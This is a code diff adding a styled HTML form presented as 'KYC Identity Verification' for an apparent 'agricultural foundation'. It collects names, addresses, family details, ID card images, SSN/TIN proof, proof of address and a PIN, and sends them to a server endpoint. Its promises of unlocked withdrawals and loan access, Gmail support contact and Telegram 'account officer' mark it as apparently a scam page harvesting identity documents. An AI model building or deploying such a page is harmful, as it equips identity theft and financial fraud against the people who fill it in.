@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔐 KYC Verification</title>
+<style>
+/* ------------------ RESET + BASE ------------------ */
+*{margin:0; padding:0; box-sizing:border-box; font-family:Poppins, sans-serif;}
+body{background: linear-gradient(135deg,#020617,#0a0f2c); color:white; padding:20px;}
+.container{max-width:900px; margin:40px auto; background:#0f172a; padding:30px; border-radius:15px; box-shadow:0 0 40px rgba(0,0,0,0.7);}
+h1{text-align:center; color:#00ffd5;}
+.sub{text-align:center; color:#ccc; margin-bottom:25px;}
+.section{background:#020617; padding:20px; border-radius:12px; margin-top:20px;}
+.section h3{color:#00ffd5; margin-bottom:15px;}
+label{font-weight:bold; display:block; margin-top:12px;}
+input, select, textarea{width:100%; padding:12px; margin-top:6px; border:none; border-radius:8px; background:#020617; color:white;}
+input[type=file]{padding:8px;}
+button.submit-btn{width:100%; padding:15px; margin-top:25px; background:#00ffd5; color:black; border:none; border-radius:10px; font-size:18px; font-weight:bold; cursor:pointer;}
+button.submit-btn:hover{background:#00c9a7;}
+.success{display:none; margin-top:25px; background:#022c22; padding:20px; border-radius:10px; text-align:center; color:#00ffd5; font-size:17px;}
+.file-preview{margin-top:5px; font-size:13px; color:#aaa;}
+@media(max-width:768px){.container{padding:20px;}}
+</style>
+</head>
+<body>
+
+<div class="container">
+<h1>🔐 KYC Identity Verification</h1>
+<div class="sub">Complete verification to secure your account & enable withdrawals</div>
+
+<form id="kycForm" enctype="multipart/form-data">
+  <!-- Personal Info -->
+  <div class="section">
+    <h3>👤 Personal Information</h3>
+    <label>Full Name</label>
+    <input type="text" id="kycName" name="name" required>
+    <label>Email Address</label>
+    <input type="email" id="kycEmail" name="email" required>
+    <label>Home Address</label>
+    <textarea id="kycAddress" name="address" required></textarea>
+    <label>Marital Status</label>
+    <select id="kycMarital" name="marital" required>
+      <option value="">Select</option>
+      <option>Single</option>
+      <option>Married</option>
+      <option>Divorced</option>
+    </select>
+    <label>Do you have kids?</label>
+    <select id="kycKids" name="kids" required>
+      <option value="">Select</option>
+      <option>Yes</option>
+      <option>No</option>
+    </select>
+  </div>
+
+  <!-- Identity Upload -->
+  <div class="section">
+    <h3>🆔 Identity Upload</h3>
+    <label>ID Card Front</label>
+    <input type="file" id="kycIdFront" name="idFront" required>
+    <span class="file-preview" id="previewFront"></span>
+    <label>ID Card Back</label>
+    <input type="file" id="kycIdBack" name="idBack" required>
+    <span class="file-preview" id="previewBack"></span>
+    <label>SSN / TIN Proof</label>
+    <input type="file" id="kycSSN" name="ssnProof" required>
+    <span class="file-preview" id="previewSSN"></span>
+    <label>Proof of Address</label>
+    <input type="file" id="kycAddressProof" name="addressProof" required>
+    <span class="file-preview" id="previewAddr"></span>
+  </div>
+
+  <!-- Security PIN -->
+  <div class="section">
+    <h3>🔑 Security Verification</h3>
+    <label>Create Security PIN (4 digits)</label>
+    <input type="password" maxlength="4" id="kycPIN" name="pin" required>
+    <label>Upload PIN Proof</label>
+    <input type="file" id="kycPINProof" name="pinProof" required>
+    <span class="file-preview" id="previewPin"></span>
+  </div>
+
+  <!-- Final Verification -->
+  <div class="section">
+    <h3>📩 Final Verification</h3>
+    <label>Request Final Verification Link</label>
+    <select id="kycFinal" name="final" required>
+      <option value="">Select</option>
+      <option>Send verification link to my email</option>
+    </select>
+    <p style="color:#aaa;font-size:14px;">
+      After submitting KYC, a verification link will be sent to your email.<br>
+      Click the link to complete account verification.
+    </p>
+  </div>
+
+  <button type="submit" class="submit-btn">Submit KYC Verification</button>
+  <div class="success" id="successBox">
+    ✅ KYC submitted successfully.<br><br>
+    📧 A verification link has been sent to your Gmail.<br>
+    Click link in your email to complete verification.<br><br>
+    Once approved:<br>
+    ✔ Withdrawal unlocked<br>
+    ✔ Loan access enabled<br><br>
+    Customer Support: agriculturalfoundationkyc@gmail.com<br>
+    Account Officer Telegram: @t.me/Afoundationservicecenter
+  </div>
+</form>
+</div>
+
+<script>
+const previews = {
+  kycIdFront: 'previewFront',
+  kycIdBack: 'previewBack',
+  kycSSN: 'previewSSN',
+  kycAddressProof: 'previewAddr',
+  kycPINProof: 'previewPin'
+};
+
+// Show file names
+Object.keys(previews).forEach(id=>{
+  document.getElementById(id).addEventListener('change', function(){
+    const fileName = this.files[0] ? this.files[0].name : '';
+    document.getElementById(previews[id]).innerText = fileName;
+  });
+});
+
+// Form submission
+document.getElementById("kycForm").addEventListener("submit", async function(e){
+    e.preventDefault();
+    const form = document.getElementById("kycForm");
+    const formData = new FormData(form);
+
+    try{
+        const response = await fetch('/api/kyc/submit', {
+            method: 'POST',
+            body: formData
+        });
+        const data = await response.json();
+        if(data.success){
+            document.getElementById("successBox").style.display="block";
+            setTimeout(()=>{ window.location.href="/kyc-confirmation.html"; },4000);
+        } else {
+            alert(data.message || "Error submitting KYC, try again.");
+        }
+    } catch(err){
+        console.error(err);
+        alert("Server error, try again later.");
+    }
+});
+</script>
+
+</body>
+</html>
